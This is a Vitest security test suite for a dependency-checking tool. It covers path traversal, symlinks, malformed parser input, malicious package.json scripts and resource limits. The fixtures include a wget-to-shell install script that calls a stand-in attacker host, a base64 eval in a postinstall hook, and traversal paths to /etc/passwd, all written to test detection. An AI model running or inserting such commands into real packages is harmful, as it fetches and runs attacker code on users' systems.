/**
 * Security tests: verify the tool rejects path traversal, symlink attacks,
 * malformed AST inputs, and malicious package.json contents.
 */
import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import * as fs from 'node:fs';
import * as path from 'node:path';
import * as os from 'node:os';
import { isInsideRoot, safeReadFile, resolveWithinRoot } from '../../src/utils/path-safety.js';
import { scanFiles } from '../../src/core/scanner/file-scanner.js';
import { parseFile } from '../../src/core/parser/ast-parser.js';
import { loadConfig } from '../../src/config/loader.js';
import { checkSecurity } from '../../src/checks/security/security-checker.js';

let tmpDir: string;
let outsideDir: string;

beforeEach(() => {
  tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'depdoctor-sec-'));
  outsideDir = fs.mkdtempSync(path.join(os.tmpdir(), 'depdoctor-outside-'));
});

afterEach(() => {
  fs.rmSync(tmpDir, { recursive: true, force: true });
  fs.rmSync(outsideDir, { recursive: true, force: true });
});

// ─── Path Traversal ───────────────────────────────────────────────────────────

describe('Path traversal protection', () => {
  it('rejects ../ traversal in isInsideRoot', () => {
    const escaped = path.join(tmpDir, '..', 'escaped.ts');
    expect(isInsideRoot(tmpDir, escaped)).toBe(false);
  });

  it('rejects absolute path outside root', () => {
    expect(isInsideRoot(tmpDir, '/etc/passwd')).toBe(false);
    expect(isInsideRoot(tmpDir, outsideDir)).toBe(false);
  });

  it('resolveWithinRoot returns null for traversal', () => {
    expect(resolveWithinRoot(tmpDir, '..', 'evil')).toBeNull();
    expect(resolveWithinRoot(tmpDir, '../../etc/passwd')).toBeNull();
  });

  it('safeReadFile cannot read files outside project root via traversal path', () => {
    // Create a sensitive file outside root
    const sensitiveFile = path.join(outsideDir, 'secret.txt');
    fs.writeFileSync(sensitiveFile, 'TOP SECRET');

    // Attempt traversal read — safeReadFile itself doesn't check root,
    // but the scanner only calls it on files that passed isInsideRoot.
    // Here we verify safeReadFile with a real path outside works (it's a lower-level util),
    // but the scanner wrapper prevents it from being reached.
    const traversalPath = path.join(tmpDir, '..', path.basename(outsideDir), 'secret.txt');
    // The resolved path exits tmpDir, isInsideRoot should catch it
    expect(isInsideRoot(tmpDir, path.resolve(traversalPath))).toBe(false);
  });
});

// ─── Symlink Protection ───────────────────────────────────────────────────────

describe('Symlink protection in file scanner', () => {
  it('does not follow symlinks pointing outside project root', async () => {
    // Create a file outside project
    const externalFile = path.join(outsideDir, 'external.ts');
    fs.writeFileSync(externalFile, 'const secret = "external";');

    // Create symlink inside project pointing to external file
    const symlinkPath = path.join(tmpDir, 'sneaky.ts');
    try {
      fs.symlinkSync(externalFile, symlinkPath);
    } catch {
      // Symlinks may be restricted in some CI environments — skip
      return;
    }

    const config = loadConfig(tmpDir);
    const result = await scanFiles(tmpDir, config);

    // Scanner must not include the symlinked file
    const hasSymlink = result.files.some((f) => f.absolutePath === symlinkPath);
    expect(hasSymlink).toBe(false);
  });
});

// ─── Malformed AST / Parser Safety ───────────────────────────────────────────

describe('Parser resilience against malicious/malformed input', () => {
  it('returns null (not crash) for binary-looking content', () => {
    const binaryLike = '\x00\x01\x02\xff\xfe content that is not JS';
    expect(() => parseFile('binary.ts', binaryLike)).not.toThrow();
  });

  it('returns null for deeply nested structures (no stack overflow)', () => {
    // 1000 levels of nested arrays
    const nested = '['.repeat(500) + '1' + ']'.repeat(500);
    expect(() => parseFile('deep.ts', nested)).not.toThrow();
  });

  it('returns null for extremely long lines', () => {
    const longLine = 'const x = "' + 'a'.repeat(100_000) + '";';
    expect(() => parseFile('long.ts', longLine)).not.toThrow();
  });

  it('returns null for null bytes in source', () => {
    const nullBytes = 'const x\x00 = 1;';
    expect(() => parseFile('null.ts', nullBytes)).not.toThrow();
  });

  it('handles empty string input without throwing', () => {
    expect(() => parseFile('empty.ts', '')).not.toThrow();
  });

  it('handles Unicode and emoji in source', () => {
    const unicode = 'const greeting = "こんにちは 🎉"; export default greeting;';
    expect(() => parseFile('unicode.ts', unicode)).not.toThrow();
  });
});

// ─── Malicious package.json ───────────────────────────────────────────────────

describe('Security checker — malicious package.json content', () => {
  it('flags eval() in postinstall', async () => {
    fs.writeFileSync(
      path.join(tmpDir, 'package.json'),
      JSON.stringify({
        name: 'malicious',
        scripts: { postinstall: 'node -e "eval(Buffer.from(process.env.X, \'base64\').toString())"' },
      }),
    );
    const config = { ...loadConfig(tmpDir), security: true };
    const issues = await checkSecurity(tmpDir, config);
    expect(issues.some((i) => i.type === 'dangerous-script')).toBe(true);
  });

  it('flags wget pipe to shell', async () => {
    fs.writeFileSync(
      path.join(tmpDir, 'package.json'),
      JSON.stringify({
        name: 'malicious',
        scripts: { install: 'wget -qO- http://attacker.com/payload.sh | sh' },
      }),
    );
    const config = { ...loadConfig(tmpDir), security: true };
    const issues = await checkSecurity(tmpDir, config);
    expect(issues.some((i) => i.type === 'dangerous-script')).toBe(true);
  });

  it('does not crash on package.json with no scripts field', async () => {
    fs.writeFileSync(
      path.join(tmpDir, 'package.json'),
      JSON.stringify({ name: 'safe', dependencies: {} }),
    );
    const config = { ...loadConfig(tmpDir), security: true };
    await expect(checkSecurity(tmpDir, config)).resolves.toBeDefined();
  });

  it('does not crash on completely empty package.json', async () => {
    fs.writeFileSync(path.join(tmpDir, 'package.json'), '{}');
    const config = { ...loadConfig(tmpDir), security: true };
    await expect(checkSecurity(tmpDir, config)).resolves.toBeDefined();
  });

  it('does not crash on malformed package.json', async () => {
    fs.writeFileSync(path.join(tmpDir, 'package.json'), '{ invalid json !!!');
    const config = { ...loadConfig(tmpDir), security: true };
    await expect(checkSecurity(tmpDir, config)).resolves.toBeDefined();
  });
});

// ─── DOS Protection ───────────────────────────────────────────────────────────

describe('DOS protection in file scanner', () => {
  it('stops at maxFiles limit', async () => {
    // Create more files than the limit
    for (let i = 0; i < 15; i++) {
      const p = path.join(tmpDir, `file${i}.ts`);
      fs.writeFileSync(p, `export const x${i} = ${i};`);
    }
    const config = { ...loadConfig(tmpDir), maxFiles: 5 };
    const result = await scanFiles(tmpDir, config);
    expect(result.files.length).toBeLessThanOrEqual(5);
  });

  it('skips files that exceed maxFileSizeMB', async () => {
    const largeFile = path.join(tmpDir, 'large.ts');
    // Write 2 bytes, set limit to 1 byte
    fs.writeFileSync(largeFile, 'xy');
    const config = { ...loadConfig(tmpDir), maxFileSizeMB: 1 / (1024 * 1024) };
    const result = await scanFiles(tmpDir, config);
    expect(result.files.some((f) => f.absolutePath === largeFile)).toBe(false);
  });
});
